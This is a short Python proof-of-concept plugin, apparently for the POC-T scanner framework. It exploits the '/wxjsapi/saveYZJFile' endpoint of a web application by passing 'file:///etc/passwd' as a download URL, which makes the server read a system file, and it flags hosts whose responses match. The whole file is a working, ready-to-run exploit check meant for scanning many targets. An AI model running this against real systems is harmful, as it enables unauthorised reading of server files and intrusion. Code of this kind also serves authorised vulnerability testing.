#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""

"""

import requests

def poc(host):
    uri = "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
    url = "http://"+str(host.strip())+uri
    evidence1 = '"status":"error"'
    evidence2 = '"filepath"'
    data = {"Host": str(host.strip()),
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7",
            "Connection": "close"
            }
    try:
        r = requests.post(url, data=data, timeout=30)
        if evidence1 in r.content or evidence2 in r.content:
            return url
    except Exception:
        return False

    return False
